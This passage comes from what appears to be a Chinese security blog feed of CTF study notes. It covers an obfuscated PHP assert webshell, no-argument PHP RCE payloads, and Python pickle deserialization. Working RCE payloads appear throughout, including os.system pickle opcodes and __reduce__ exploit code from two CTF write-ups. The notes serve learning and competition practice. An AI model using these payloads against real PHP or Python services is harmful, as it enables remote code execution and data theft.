class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure><h1 id="无参RCE"><a href="#无参RCE" class="headerlink" title="无参RCE"></a>无参RCE</h1><p><a href="https://www.cnblogs.com/pursue-security/p/15406272.html">https://www.cnblogs.com/pursue-security/p/15406272.html</a><br>过滤源码类似:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要执行的代码只能是 <code>a(b(c()));</code> 这种形式<br>一种方法是利用 <code>getallheader();</code><br>然后使用 <code>end()</code> 或 <code>reset()</code> 取出首&#x2F;尾元素</p><ul><li>end() - 将内部指针指向数组中的最后一个元素，并输出。</li><li>next() - 将内部指针指向数组中的下一个元素，并输出。</li><li>prev() - 将内部指针指向数组中的上一个元素，并输出。</li><li>reset() - 将内部指针指向数组中的第一个元素，并输出。</li><li>each() - 返回当前元素的键名和键值，并将内部指针向前移动。</li></ul><p>与php版本有关<br>php5似乎不能使用getallheader<br>php7会把注入请求头放在最前面<br>不知道文章博主是什么版本<br>我的payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=eval(reset(getallheaders()));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaa:system(&quot;dir&quot;);</span><br></pre></td></tr></table></figure><p>那么同理:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));<span class="comment">//包含get、post、cookie、file四个参数</span></span><br></pre></td></tr></table></figure><p>还可以利用cookie中的session_id：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>()))<span class="comment">//php的cookie中的session id</span></span><br></pre></td></tr></table></figure><p>利用 <code>localeconv</code> 获取 <code>.</code> 以直接读取文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())) <span class="comment">//.</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())) <span class="comment">//列当前目录</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/2025/12/29/pickle-unserialize/"/>
      <url>/2025/12/29/pickle-unserialize/</url>
      
        <content type="html"><![CDATA[<h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><p><a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a><br>pickle反序列化比java和php的危害要大不少<br>因为利用起来比较容易，很轻松可以RCE<br>经常和其它基础漏洞配合起来使用</p><h3 id="能够序列化的对象"><a href="#能够序列化的对象" class="headerlink" title="能够序列化的对象"></a>能够序列化的对象</h3><ul><li>None</li><li>bool</li><li>int,float,complex</li><li>元素全部为可打包对象的tuple、list、set 和 dict</li><li>函数<ul><li>使用def定义的模块顶层的函数(lambda不行)</li><li>内置函数</li></ul></li><li>类<ul><li>使用class定义在模块顶层的</li></ul></li><li>实例对象<ul><li><code>__dict__</code>属性和<code>__getstate__()</code>函数的返回值为可序列化对象</li></ul></li></ul><p>PS:对于不能序列化的数据会抛出<code>PicklingError</code>异常</p><h3 id="opcode和Bytecode"><a href="#opcode和Bytecode" class="headerlink" title="opcode和Bytecode"></a>opcode和Bytecode</h3><p>pickle的序列化数据的一种格式是opcode（直译就是操作码）</p><p>是一种独立的栈语言，</p><p>Python Bytecode (<code>.pyc</code>): 是给 PVM (Python Virtual Machine) 看的，用于通用的程序逻辑</p><p>例如：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a + b</span><br></pre></td></tr></table></figure><p>转换成指令流：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>           <span class="number">0</span> LOAD_FAST                <span class="number">0</span> (a)</span><br><span class="line">            <span class="number">2</span> LOAD_FAST                <span class="number">1</span> (b)</span><br><span class="line">            <span class="number">4</span> BINARY_ADD</span><br><span class="line">            <span class="number">6</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><p>这整个指令流被称为Bytecode（但实际上更普遍的被称为opcode）</p><p>而类似<code>LOAD_FAST</code>的单个指令就是一个普遍的opcode</p><h3 id="pickle-opcode"><a href="#pickle-opcode" class="headerlink" title="pickle opcode"></a>pickle opcode</h3><p>Pickle Opcode: 是给 Unpickler (Pickle 虚拟机) 看的，专门用于构建对象</p><p>刚刚介绍的正常opcode包含很多复杂的指令逻辑例如做加法 (<code>BINARY_ADD</code>)、比较大小 (<code>COMPARE_OP</code>)、循环 (<code>JUMP_ABSOLUTE</code>)。</p><p>但pickle的opcode只支持存储与堆叠，旨在恢复数据</p><p>以下是大部分常见pickle opcode</p><table><thead><tr><th align="left">Opcode (Char&#x2F;Hex)</th><th align="left">Name</th><th align="left">Description (功能描述)</th></tr></thead><tbody><tr><td align="left"><strong>基础控制与数值</strong></td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><code>.</code> (<code>0x2e</code>)</td><td align="left"><code>STOP</code></td><td align="left">结束 Pickle 流，反序列化完成</td></tr><tr><td align="left"><code>N</code> (<code>0x4e</code>)</td><td align="left"><code>NONE</code></td><td align="left">推送 <code>None</code> 到栈顶</td></tr><tr><td align="left"><code>I</code> (<code>0x49</code>)</td><td align="left"><code>INT</code></td><td align="left">推送整数 (文本格式)</td></tr><tr><td align="left"><code>F</code> (<code>0x46</code>)</td><td align="left"><code>FLOAT</code></td><td align="left">推送浮点数 (文本格式)</td></tr><tr><td align="left"><code>S</code> (<code>0x53</code>)</td><td align="left"><code>STRING</code></td><td align="left">推送字符串 (带引号的文本格式)</td></tr><tr><td align="left"><code>V</code> (<code>0x56</code>)</td><td align="left"><code>UNICODE</code></td><td align="left">推送 Unicode 字符串</td></tr><tr><td align="left"><code>K</code> (<code>0x4b</code>)</td><td align="left"><code>BININT1</code></td><td align="left">推送 1 字节无符号整数</td></tr><tr><td align="left"><code>M</code> (<code>0x4d</code>)</td><td align="left"><code>BININT2</code></td><td align="left">推送 2 字节无符号整数</td></tr><tr><td align="left"><code>J</code> (<code>0x4a</code>)</td><td align="left"><code>BININT</code></td><td align="left">推送 4 字节有符号整数</td></tr><tr><td align="left"><strong>容器构建 (List&#x2F;Dict&#x2F;Tuple)</strong></td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><code>(</code> (<code>0x28</code>)</td><td align="left"><code>MARK</code></td><td align="left">推送标记 (Mark) 到栈顶，用于界定容器边界</td></tr><tr><td align="left"><code>l</code> (<code>0x6c</code>)</td><td align="left"><code>LIST</code></td><td align="left">构建列表 (从栈顶直到 Mark)</td></tr><tr><td align="left"><code>d</code> (<code>0x64</code>)</td><td align="left"><code>DICT</code></td><td align="left">构建字典 (从栈顶直到 Mark)</td></tr><tr><td align="left"><code>t</code> (<code>0x74</code>)</td><td align="left"><code>TUPLE</code></td><td align="left">构建元组 (从栈顶直到 Mark)</td></tr><tr><td align="left"><code>]</code> (<code>0x5d</code>)</td><td align="left"><code>EMPTY_LIST</code></td><td align="left">推送一个空列表</td></tr><tr><td align="left"><code>&#125;</code> (<code>0x7d</code>)</td><td align="left"><code>EMPTY_DICT</code></td><td align="left">推送一个空字典</td></tr><tr><td align="left"><code>a</code> (<code>0x61</code>)</td><td align="left"><code>APPEND</code></td><td align="left">将栈顶元素 append 到栈顶下方的列表中</td></tr><tr><td align="left"><code>e</code> (<code>0x65</code>)</td><td align="left"><code>APPENDS</code></td><td align="left">批量 append (从 Mark 开始) 到列表</td></tr><tr><td align="left"><code>s</code> (<code>0x73</code>)</td><td align="left"><code>SETITEM</code></td><td align="left">设置字典键值对 (key, value)</td></tr><tr><td align="left"><code>u</code> (<code>0x75</code>)</td><td align="left"><code>SETITEMS</code></td><td align="left">批量设置字典键值对 (从 Mark 开始)</td></tr><tr><td align="left"><strong>对象与类</strong></td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><code>c</code> (<code>0x63</code>)</td><td align="left"><code>GLOBAL</code></td><td align="left">导入模块和类 (Module.Class) 并推送到栈</td></tr><tr><td align="left"><code>R</code> (<code>0x52</code>)</td><td align="left"><code>REDUCE</code></td><td align="left">调用可调用对象 (通常用于通过类和参数重建对象)</td></tr><tr><td align="left"><code>b</code> (<code>0x62</code>)</td><td align="left"><code>BUILD</code></td><td align="left">调用 <code>__setstate__</code> 或更新 <code>__dict__</code> 来恢复对象状态</td></tr><tr><td align="left"><code>o</code> (<code>0x6f</code>)</td><td align="left"><code>OBJ</code></td><td align="left">构建类实例 (旧协议，基于栈上的类和参数)</td></tr><tr><td align="left"><code>i</code> (<code>0x69</code>)</td><td align="left"><code>INST</code></td><td align="left">实例化对象 (相当于 GLOBAL + MARK + BUILD 的旧版组合)</td></tr><tr><td align="left"><code>\x81</code> (<code>0x81</code>)</td><td align="left"><code>NEWOBJ</code></td><td align="left">(Proto 2+) 直接创建新对象实例 (不调 <code>__init__</code>)</td></tr><tr><td align="left"><strong>Memoization (记忆&#x2F;引用)</strong></td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><code>p</code> (<code>0x70</code>)</td><td align="left"><code>PUT</code></td><td align="left">将栈顶对象存入 memo (文本索引)</td></tr><tr><td align="left"><code>q</code> (<code>0x71</code>)</td><td align="left"><code>BINPUT</code></td><td align="left">将栈顶对象存入 memo (1字节二进制索引)</td></tr><tr><td align="left"><code>r</code> (<code>0x72</code>)</td><td align="left"><code>LONG_BINPUT</code></td><td align="left">将栈顶对象存入 memo (4字节二进制索引)</td></tr><tr><td align="left"><code>g</code> (<code>0x67</code>)</td><td align="left"><code>GET</code></td><td align="left">从 memo 获取对象 (文本索引)</td></tr><tr><td align="left"><code>h</code> (<code>0x68</code>)</td><td align="left"><code>BINGET</code></td><td align="left">从 memo 获取对象 (1字节二进制索引)</td></tr><tr><td align="left"><strong>栈操作</strong></td><td align="left"></td><td align="left"></td></tr><tr><td align="left"><code>0</code> (<code>0x30</code>)</td><td align="left"><code>POP</code></td><td align="left">弹出栈顶元素</td></tr><tr><td align="left"><code>2</code> (<code>0x32</code>)</td><td align="left"><code>DUP</code></td><td align="left">复制栈顶元素</td></tr></tbody></table><p>这里用一个简单的最常规的命令执行来举例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">cos</span><br><span class="line">system   <span class="comment">#字节码为c，形式为c[moudle]\n[instance]\n，导入os.system。并将函数压入stack</span></span><br><span class="line"> </span><br><span class="line">(S<span class="string">&#x27;ls&#x27;</span>   <span class="comment">#字节码为(，向stack中压入一个MARK。字节码为S，示例化一个字符串对象&#x27;whoami&#x27;并将其压入stack</span></span><br><span class="line"> </span><br><span class="line">tR.      <span class="comment">#字节码为t，寻找栈中MARK，并组合之间的数据为元组。然后通过字节码R执行os.system(&#x27;whoami&#x27;)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#字节码为.，程序结束，将栈顶元素os.system(&#x27;ls&#x27;)作为返回值</span></span><br></pre></td></tr></table></figure><p>这里的栈是pickle模块内部的一个列表</p><p>“压入栈”实际就是append进列表</p><p>过程模拟：</p><p>第一步</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">|               |</span><br><span class="line">| os.system     | &lt;--- 栈顶</span><br><span class="line">|_______________|</span><br></pre></td></tr></table></figure><p>第二步</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">| (MARK)        | &lt;--- 栈顶</span><br><span class="line">| os.system     |</span><br><span class="line">|_______________|</span><br></pre></td></tr></table></figure><p>第三步</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">| <span class="string">&#x27;whoami&#x27;</span>      | &lt;--- 栈顶</span><br><span class="line">| (MARK)        |</span><br><span class="line">| os.system     |</span><br><span class="line">|_______________|</span><br></pre></td></tr></table></figure><p>第四步<code>t</code>构建元组</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">| (<span class="string">&#x27;whoami&#x27;</span>,)   | &lt;--- 栈顶 (这是一个元组，作为参数列表)</span><br><span class="line">| os.system     | &lt;--- 这里的 os.system 一直没动</span><br><span class="line">|_______________|</span><br></pre></td></tr></table></figure><p>第五步R执行函数，要求栈顶为参数元组，栈顶的下面一个元素为可执行函数</p><p>第六步<code>.</code>停止</p><p>那么了解这个过程后拓展其余的执行函数的过程就很清晰了</p><hr><p>字节码<code>o</code>:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode3=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>以上一个mark上的第一个数据（必须是可执行函数）为函数</p><p>以第2~n个数据为函数参数执行</p><hr><p>字节码<code>i</code>:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode2=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>用类似c的方式获取到一个可执行函数，然后寻找上一个mark，以mark和自身之间的入栈数据作为元组，以元组作为参数执行</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h5 id="2024极客大挑战-ez-python"><a href="#2024极客大挑战-ez-python" class="headerlink" title="2024极客大挑战-ez_python"></a>2024极客大挑战-ez_python</h5><p>常规注册登录，暂时没有发现可攻击的点<br>但登录后提示查看:<code>/starven_s3cret</code><br>成功获得源码:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, make_response, render_template, send_file</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> black</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#To Ctfer：给你源码只是给你漏洞点的hint，怎么绕？black.py黑盒，唉无意义</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(<span class="string">&#x27;templates/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        usname = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        passwd = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> usname <span class="keyword">and</span> passwd:</span><br><span class="line">            heart_cookie = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">            response = make_response(<span class="string">f&quot;Registered successfully with username: <span class="subst">&#123;usname&#125;</span> &lt;br&gt; Now you can go to /login to heal starven&#x27;s heart&quot;</span>)</span><br><span class="line">            response.set_cookie(<span class="string">&#x27;heart&#x27;</span>, heart_cookie)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>  render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    heart_cookie = request.cookies.get(<span class="string">&#x27;heart&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> heart_cookie:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;warning.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.cookies.get(<span class="string">&#x27;heart&#x27;</span>) == heart_cookie:</span><br><span class="line">        statement = request.form[<span class="string">&#x27;statement&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            heal_state = base64.b64decode(statement)</span><br><span class="line">            <span class="built_in">print</span>(heal_state)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> black.blacklist:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> heal_state:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;waf.html&#x27;</span>)</span><br><span class="line">            pickle.loads(heal_state)</span><br><span class="line">            res = make_response(<span class="string">f&quot;Congratulations! You accomplished the first step of healing Starven&#x27;s broken heart!&quot;</span>)</span><br><span class="line">            flag = os.getenv(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">or</span> os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">            os.system(<span class="string">&quot;echo &quot;</span> + flag + <span class="string">&quot; &gt; /flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>( e)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error!!!! give you hint: maybe you can view /starven_s3cret&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/monologue&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">joker</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;joker.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/starven_s3cret&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>可见是一个pickle注入题目<br>而登录时对starven学长说的话就是需要注入的内容,需要base64加密<br>那么构造如下poc:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(<span class="string">&quot;111&quot;</span>)))</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">aaa</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">111</span>)</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;xxx&#x27;)&quot;</span>,))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">a = aaa()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br><span class="line"></span><br><span class="line">pickle.loads(base64.b64decode(<span class="string">&quot;gASVOQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCFlY2hvICIyMjIiPiBmaW5kIC1uYW1lIGpva2VyLmh0bWyUhZRSlC4=&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即可执行任意命令，本想弹shell，结果弹shell的各种方法被过滤，<br>另寻他法后发现index.html的文件位置精确的暴露了，那么我们只要将执行命令的回显写入即可:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;env &gt; templates/index.html&#x27;)&quot;</span>,))</span><br></pre></td></tr></table></figure><p>再回到首页即可成功获得flag<br>当然预期解的打法那就是写内存马</p><h5 id="2025TSGCTF"><a href="#2025TSGCTF" class="headerlink" title="2025TSGCTF"></a>2025TSGCTF</h5><p>直接使用nc连接，</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;\x80\x03&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;cbuiltins\ntuple\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;cbuiltins\nmap\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x28&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;cos\nsystem\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x28&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;S\&#x27;cat flag.txt\&#x27;\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;l&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;t&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x81&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x85&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x81&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p>这里首先设置了协议为3，不过实际测试似乎不需要</p><p>然后实现的操作实际上是</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">tuple</span>(<span class="built_in">map</span>(os.system, [<span class="string">&#x27;cat flag.txt&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>这里的思路和java反序列化中cc链有异曲同工之妙</p><h3 id="pickle完整操作码表"><a href="#pickle完整操作码表" class="headerlink" title="pickle完整操作码表"></a>pickle完整操作码表</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Hex    ASCII    Name             Description (中文描述)</span><br><span class="line">================================================================================</span><br><span class="line"><span class="comment"># 基础通用指令 (Protocol 0 - 1) - 大多对应可见字符</span></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">\x28   (        MARK             压入标记对象 (MARK)，用于界定列表/元组范围</span><br><span class="line">\x29   )        EMPTY_TUPLE      压入一个空元组</span><br><span class="line">\x2e   .        STOP             反序列化结束 (Stop)，返回栈顶元素</span><br><span class="line">\x30   <span class="number">0</span>        POP              弹出(丢弃)栈顶元素</span><br><span class="line">\x31   <span class="number">1</span>        POP_MARK         弹出栈顶直到遇到标记 (MARK) 并丢弃</span><br><span class="line">\x32   <span class="number">2</span>        DUP              复制栈顶元素并再次压入</span><br><span class="line">\x46   F        FLOAT            压入浮点数 (文本格式)</span><br><span class="line">\x47   G        BINFLOAT         压入浮点数 (<span class="number">8</span>字节二进制格式)</span><br><span class="line">\x49   I        INT              压入整数 (文本格式)</span><br><span class="line">\x4a   J        BININT           压入<span class="number">4</span>字节有符号整数</span><br><span class="line">\x4b   K        BININT1          压入<span class="number">1</span>字节无符号整数</span><br><span class="line">\x4c   L        LONG             压入长整数</span><br><span class="line">\x4d   M        BININT2          压入<span class="number">2</span>字节无符号整数</span><br><span class="line">\x4e   N        NONE             压入 <span class="literal">None</span></span><br><span class="line">\x50   P        PERSID           压入持久化ID对象</span><br><span class="line">\x51   Q        BINPERSID        压入持久化ID对象 (二进制)</span><br><span class="line">\x52   R        REDUCE           执行函数 (取出栈顶元组作为参数，次栈顶作为函数执行)</span><br><span 